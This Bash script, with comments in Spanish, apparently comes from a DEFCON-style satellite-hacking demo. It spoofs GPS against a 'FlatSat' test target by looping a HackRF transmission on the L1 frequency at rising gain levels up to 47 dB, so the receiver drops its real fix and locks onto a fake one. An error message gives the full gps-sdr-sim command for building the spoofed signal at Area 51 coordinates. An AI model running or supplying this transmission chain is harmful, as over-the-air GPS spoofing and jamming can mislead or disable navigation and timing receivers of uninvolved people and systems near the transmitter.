#!/usr/bin/env bash
# Rampa de ganancia TX para GPS spoofing contra el FlatSat -- misma
# logica que el spoof_ramp_v2.sh original del usuario
# (~/Desktop/DEFCON/Demos-Testing/gps-sdr-sim/), adaptada a
# pwnsat_area51_timefix.bin: el primer intento con este target (60s de
# un solo burst, ver steps.txt "PRIMER INTENTO") solo logro jamming
# (tumbo el fix real, nunca engancho el falso) -- un cold-start de GPS
# necesita tiempo sostenido de senal fuerte para decodificar subframes
# completos y trackear, no un burst corto. Esta rampa sostiene cada
# nivel de ganancia varios minutos en loop (-R) antes de pasar al
# siguiente, con una pausa sin transmitir entre niveles para observar
# si el receptor se recupera solo (senal de que el nivel anterior era
# insuficiente) o si logro enganchar el fix falso.
#
# Uso: ./spoof_ramp.sh [path/al/target.bin]
# Sin argumento, busca pwnsat_area51_timefix.bin junto a este script -- no
# viene incluido en el repo (no es texto, es una grabacion IQ de cientos
# de MB), hay que generarlo con gps-sdr-sim (ver el ERROR de mas abajo
# para el comando completo).
# Para abortar en cualquier momento: Ctrl+C -- el nivel de ganancia que
# estaba corriendo se corta ahi, no hace falta esperar a que termine.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN_FILE="${1:-$SCRIPT_DIR/pwnsat_area51_timefix.bin}"
FREQ=1575420000
SAMPLE_RATE=2600000
TEST_SECONDS=180     # 3 min de transmision continua por nivel (-R loopea el .bin de 60s)
PAUSE_SECONDS=120    # 2 min de pausa entre niveles, para observar recuperacion
SAMPLES_PER_TEST=$((SAMPLE_RATE * TEST_SECONDS))
GAINS=(0 10 20 30 40 47)

if [ ! -f "$BIN_FILE" ]; then
  echo "ERROR: no encuentro $BIN_FILE"
  echo "Pasalo como argumento (./spoof_ramp.sh path/al/target.bin) o generalo con"
  echo "un build propio de gps-sdr-sim (github.com/osqzss/gps-sdr-sim):"
  echo "  ./gps-sdr-sim -e brdc0010.22n -l 37.2431,-115.7930,1360 \\"
  echo "      -t \$(date -u +%Y/%m/%d,%H:%M:%S) -T \$(date -u +%Y/%m/%d,%H:%M:%S) \\"
  echo "      -d 60 -s 2600000 -b 8 -p -o pwnsat_area51_timefix.bin"
  exit 1
fi

TOTAL=${#GAINS[@]}
INDEX=0

for GAIN in "${GAINS[@]}"; do
  INDEX=$((INDEX + 1))
  echo "=================================================="
  echo "  Nivel $INDEX/$TOTAL  -  TX gain -x $GAIN dB  |  amp -a 1"
  echo "  Transmitiendo ${TEST_SECONDS}s ($((TEST_SECONDS / 60)) min) en loop. Mira el dashboard de C3."
  echo "=================================================="
  hackrf_transfer -t "$BIN_FILE" -f "$FREQ" -s "$SAMPLE_RATE" \
    -a 1 -x "$GAIN" -R -n "$SAMPLES_PER_TEST"

  if [ "$INDEX" -lt "$TOTAL" ]; then
    echo "--- fin del nivel -x $GAIN. Pausa de ${PAUSE_SECONDS}s (sin transmitir) ---"
    sleep "$PAUSE_SECONDS"
  fi
done

echo "Rampa completa."
